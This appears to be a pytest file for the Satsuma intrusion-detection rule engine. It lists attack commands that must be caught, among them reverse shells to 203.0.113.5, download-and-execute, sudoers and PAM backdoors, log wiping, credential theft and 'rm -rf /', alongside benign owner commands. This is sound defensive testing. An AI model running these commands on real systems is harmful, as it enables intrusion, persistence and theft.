"""2.2.54: attacks that had no rule (field coverage analysis 2026-11-19), and the
owner's own commands that must not be taken for them."""
import time

import pytest

from satsuma import enforcement
from satsuma.dashboard_api import RULES_DIR
from satsuma.smart_rules import SmartRuleEngine


def hits(cmd, exe=None, uid='1000'):
    engine = SmartRuleEngine(RULES_DIR)
    exe = exe or '/usr/bin/' + cmd.split()[0].rsplit('/', 1)[-1]
    event = {'source': 'audit', 'kind': 'execve', 'action': 'execve', 'cmd': cmd, 'exe': exe, 'uid': uid,
             'pid': '4242', 'timestamp': time.time()}
    return {f['rule_id']: f for f in engine.match(event)}


def stops(found):
    return any(enforcement.eligible(f) for f in found.values())


ATTACKS = [
    ('python3 -c import socket,os,pty;s=socket.socket();s.connect(("203.0.113.5",4444));os.dup2(s.fileno(),0);pty.spawn("/bin/sh")', None),
    ('perl -e use Socket;$i="203.0.113.5";socket(S,PF_INET,SOCK_STREAM,6);connect(S,$a);open(STDIN,">&S");exec("/bin/sh -i");', None),
    ('php -r $sock=fsockopen("203.0.113.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");', None),
    ('ncat 203.0.113.5 4444 --exec /bin/bash', None),
    ('sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.5 4444 >/tmp/f', '/usr/bin/sh'),
    ('sh -c exec 5<>/dev/tcp/203.0.113.5/443;cat <&5', '/usr/bin/sh'),
    ('sh -c curl -o /tmp/.x http://203.0.113.5/x && chmod +x /tmp/.x && /tmp/.x', '/usr/bin/sh'),
    ('/tmp/kworker', '/tmp/kworker'),
    ('useradd -o -u 0 -g 0 sysbk', None), ('usermod -aG wheel helper', None),
    ('sh -c echo "u ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers', '/usr/bin/sh'),
    ('chmod u+s /tmp/bash', None), ('chmod 4755 /tmp/rootsh', None), ('setcap cap_setuid+ep /tmp/python3', '/usr/sbin/setcap'),
    ('auditctl -D', '/usr/sbin/auditctl'), ('pkill clamd', None), ('nft delete table inet satsuma_core', '/usr/sbin/nft'),
    ('journalctl --vacuum-time=1s', None), ('mount -o bind /tmp/empty /proc/1234', None),
    ('dd if=/proc/1234/mem of=/tmp/m', None), ('cat /dev/input/event3', None), ('unshadow /etc/passwd /etc/shadow', None),
    ('hydra -l root -P rockyou.txt ssh://10.0.0.5', None), ('nmap -sS 10.0.0.0/24', None), ('ngrok tcp 22', '/home/u/.local/bin/ngrok'),
    ('rm -rf --no-preserve-root /', None), ('systemd-run --user --on-calendar=minutely /tmp/x', None),
    ('find . -exec /bin/sh -p ; -quit', None), ('env LD_PRELOAD=/tmp/x.so /usr/bin/ls', None),
    ('ostree admin undeploy 1', None), ('podman run -v /:/mnt --rm -it alpine chroot /mnt sh', None),
    # 2.2.55: Atomic Red Team techniques that had no rule.
    ('ccencrypt -T -K passwd /tmp/passwd', None), ('7z a -ppasswd /tmp/passwd.zip /etc/passwd', None),
    ('openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/x', None),
    ('sh -c echo "import os; os.system(1)" > /home/u/.local/lib/python3.15/site-packages/x.pth', '/usr/bin/sh'),
    ('bash -c trap "nohup sh /tmp/x.sh" EXIT', '/usr/bin/bash'), ('tcpdump -c 5 -nnni ens33', None),
    ('sed -i 1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g /etc/pam.d/su-l', None),
    ('auditctl -a always,exit -F arch=b64 -S execve -k CMDS', '/usr/sbin/auditctl'), ('cat /home/u/.bash_history', None),
    ('xwd -root -out /tmp/d.xwd', None), ('gcc /tmp/x.c', None), ('sh /tmp/image.png', '/usr/bin/sh'),
    ('/home/u/.../sh -c echo', '/home/u/.../sh'), ('kill -SIGTERM $(pgrep auditd)', '/usr/bin/bash'),
    ('torsocks curl http://x.onion', None), ('sshpass -p x ssh root@localhost', None),
    ('mkdir /var/tmp/.hidden-directory', None), ('python3 -c from zipfile import ZipFile; ZipFile(1).write(/etc/shadow)', None),
    ('python3 /tmp/LaZagne/Linux/laZagne.py browsers', None),
    ('cp /home/u/.mozilla/firefox/x.default/key4.db /tmp/', None), ('rm -rf /var/spool/mail/copy', None),
]


@pytest.mark.parametrize('cmd,exe', ATTACKS)
def test_attack_is_caught_and_stopped(cmd, exe):
    found = hits(cmd, exe)
    assert found and stops(found), cmd


@pytest.mark.parametrize('cmd,rule', [
    ('rpm-ostree uninstall satsuma-core', 'SATSUMA-GAP-036'),
    ('rm -f /var/lib/satsuma-core/core.db', 'SATSUMA-GAP-037'),
    ('chattr +i /dev/shm', 'SATSUMA-GAP-025'),
    ('update-ca-trust', 'SATSUMA-GAP-052'),
])
def test_alarm_only_rules_alarm_but_never_stop(cmd, rule):
    # 2.2.61 (owner, 2026-11-20): in the strictest mode (default) GAP-036/037/052 stop;
    # the owner's chattr (GAP-025) stays an alarm. With the mode off all four only alarm.
    found = hits(cmd, uid='0')
    assert rule in found and found[rule]['classification'] == 'suspicious'
    # 2.2.64: removing/updating Satsuma (GAP-036) never stops either: the owner's way out.
    assert enforcement.eligible(found[rule]) is (rule not in ('SATSUMA-GAP-025', 'SATSUMA-GAP-036'))
    relaxed = {k: v for k, v in found[rule].items() if k != 'owner_strict'}
    assert not enforcement.eligible(relaxed)


OWNER = ['sudo su', 'su -', '/usr/sbin/usermod -a -G satsuma-reader satsumabilgisayar', '/usr/bin/auditctl -R /etc/audit/audit.rules',
         '/usr/sbin/auditctl -s', '/usr/sbin/nft delete table inet satsuma_health_probe', 'nft list ruleset', 'ss -tunnap',
         'chattr -i /ostree/deploy/x/etc/resolv.conf', 'ostree admin cleanup', 'rpm-ostree override remove ibus',
         'rpm-ostree install ./satsuma-core-2.2.54-1.fc44.x86_64.rpm', 'chmod 2775 /srv/share', 'chmod g+s /srv/share', 'chmod +x run.sh',
         'python3 -c import socket; print(socket.gethostname())', 'mount -o remount,rw /sysroot', 'nc -z example.com 80',
         'ssh -L 8080:localhost:80 user@host', 'curl -o /tmp/x.json https://api.example.com/x', 'journalctl -b -u upower',
         'podman run --rm -it fedora bash', 'systemd-run --user --scope firefox', 'rm -rf build/', 'bash -x test.sh',
         'sqlite3 /var/lib/satsuma-core/core.db .tables', 'LD_PRELOAD=/usr/lib64/libjemalloc.so app', 'killall firefox',
         '/usr/bin/pkexec /usr/bin/satsuma-enroll-desktop --user u --password-stdin', 'cat /var/lib/satsuma-core/.ostree-installed',
         'gpg --encrypt -r me notes.txt', 'gpg -d secret.gpg', '7z x archive.7z', 'git log', 'history', 'passwd',
         'passwd -S u', 'mkdir /tmp/build', 'mkdir -p /tmp/.X11-unix', 'gcc main.c -o main', 'sh install.sh',
         'ssh -L 5432:db:5432 host', 'cp notes.txt /home/u/Belgeler/', 'firefox --profile /home/u/.mozilla/firefox/x.default',
         'kill -9 12345', 'pkill -f opera', 'python3 -c print(1)', 'python3 script.py /etc/passwd']


@pytest.mark.parametrize('cmd', OWNER)
def test_owner_commands_are_not_new_attacks(cmd):
    assert not [r for r in hits(cmd, uid='0') if r.startswith('SATSUMA-GAP')], cmd


def test_trace_only_findings_are_recorded_but_never_stopped():
    import run_satsuma_teams as T
    silent = {'rule_id': 'SATSUMA-PRIV-017', 'classification': 'indicator', 'severity': 'critical', 'log_only': True}
    assert T._recordable(silent) and silent['trace_only'] is True
    assert not enforcement.eligible(silent) and not enforcement.automatic_allowed(silent)
    assert not T._recordable({'classification': 'indicator', 'severity': 'medium', 'log_only': True})
